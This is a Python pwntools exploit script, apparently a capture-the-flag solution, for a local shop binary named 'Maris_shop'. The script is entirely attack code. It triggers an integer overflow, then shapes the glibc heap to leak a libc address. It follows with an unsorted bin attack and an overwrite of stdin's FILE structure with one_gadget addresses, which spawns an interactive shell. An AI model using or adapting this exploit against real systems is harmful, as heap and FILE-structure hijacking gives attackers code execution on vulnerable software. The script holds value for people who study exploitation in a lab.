from pwn import *

stdin_buf_end_offset = 0x3c4920
vtable_offset = 0x3c36e0
one_gadget_offset = 0xf02a4  # 0x45216 0x4526a 0xf02a4 0xf1147

p = process('./Maris_shop', env={'LD_PRELOAD': './libc.so.6'})


def overflow():
    p.sendlineafter('Your choice:', str(1))
    p.recvuntil('---- ')
    price = int(p.recvuntil('\n', drop=True))
    p.sendlineafter('Which item?:', '1')
    p.sendlineafter('Amount?:', str(0xa0000000 / price))
    p.sendlineafter('Your choice:', '4')
    p.sendlineafter('Your choice:', '1')
    p.sendlineafter('Which item?:', '0')
    p.recvuntil('Done!\n\n')


def unsorted_bin_attack():
    p.sendlineafter('Your choice:', str(1))
    result = p.recvuntil('Which item?:').split('\n')
    del result[0]
    del result[-1]

    for item in result:
        if item_name in item:
            return item[0], result
    return None, result


def is_in_cart(result):
    null_idx = 1

    while True:
        for item in result:
            for item_in_cart in items_in_cart:
                if item_in_cart in item:
                    return null_idx
            null_idx = null_idx + 1
        return None


def add(idx, amount):
    p.sendlineafter('Your choice:', str(1))
    p.sendlineafter('Which item?:', str(idx))
    p.sendlineafter('?:', str(amount))
    p.recvuntil('Done!\n\n')


def remove(idx):
    p.sendlineafter('Your choice:', str(2))
    p.sendlineafter('Which item?:', str(idx))


def buy(idx, buy_all):
    p.sendlineafter('Your choice:', str(4))
    if buy_all:
        p.sendlineafter('Your choice:', str(2))
        p.sendlineafter('Your choice:', str(1))
    else:
        p.sendlineafter('Your choice:', str(1))
        p.sendlineafter('Which item?:', str(idx))
    p.recvuntil('Done!\n\n')


def show(idx, show_all):
    p.sendlineafter('Your choice:', str(3))
    if show_all:
        p.sendlineafter('Your choice:', str(2))
    else:
        p.sendlineafter('Your choice:', str(1))
        p.sendlineafter('Which item?:', str(idx))


# gdb.attach(p, '')

# Increase the number of crystals by integer overflow
overflow()

# add 16 items and buy all
while True:
    add(1, 1)
    show(0, True)
    result = p.recvuntil('You', drop=True).split('\n')
    del result[0]
    del result[-1]
    del result[-1]
    if len(result) == 16:
        break

buy(0, True)

# make two orphan chunks
while True:
    add(1, 1)
    show(0, True)
    result = p.recvuntil('You', drop=True).split('\n')
    del result[0]
    del result[-1]
    del result[-1]
    if len(result) == 3:
        break

remove(0)
remove(0)

# allocate 15 chunks and Libc leak
while True:
    add(1, 1)
    show(0, True)
    result = p.recvuntil('You', drop=True).split('\n')
    del result[0]
    del result[-1]
    del result[-1]
    if len(result) == 16:
        break

buy(0xd, False)
show(0xe, False)

p.recvuntil('Amount: ')
libc_addr = int(p.recvuntil('\n')[:-1]) - 0x3c4b78

log.info('Libc Addr: ' + hex(libc_addr))
log.info('Arena + 88: ' + hex(libc_addr + 0x3c4b78))
log.info('One_gadget_addr: ' + hex(libc_addr + one_gadget_offset))

# Unsorted bin Attack
show(0, True)
items_in_cart = p.recvuntil('14: ').split('\n')
del items_in_cart[0]
del items_in_cart[-1]

for x in range(len(items_in_cart)):
    if(x < 9):
        items_in_cart[x] = items_in_cart[x][3:]
    else:
        items_in_cart[x] = items_in_cart[x][4:]

item_name = p.recvuntil('\n')[:-1]
log.info('Item name: ' + item_name)
log.info('Diff Offset: ' + hex(stdin_buf_end_offset - 0x3c4b78))

while True:
    idx, result = unsorted_bin_attack()
    if idx is None:
        null_idx = is_in_cart(result)
        if null_idx is None:
            log.info('Error')
        log.info(null_idx)
        p.sendline(str(null_idx))
        p.sendlineafter('?:', str(1))
        p.recvuntil('Done!\n\n')
    else:
        p.sendline(idx)
        p.sendlineafter('Add more?:', str(
            stdin_buf_end_offset - 0x10 - 0x3c4b78))
        p.recvuntil('Done!\n\n')
        break

while True:
    add(1, 1)
    show(0, True)
    result = p.recvuntil('You', drop=True).split('\n')
    del result[0]
    del result[-1]
    del result[-1]
    if len(result) == 16:
        break

payload = '\x00'*5 + p64(libc_addr+0x3c6790)
payload += p64(0xffffffffffffffff) + p64(0x0000000000000000)
payload += p64(libc_addr + 0x3c49c0) + p64(0)*3
payload += p64(0x00000000ffffffff) + p64(0)*2 + p64(libc_addr + 0x3c49c0)
payload += p64(0)*2 + p64(libc_addr + one_gadget_offset)*10
p.sendline(payload)
p.recvuntil('Your choice:')
p.interactive()
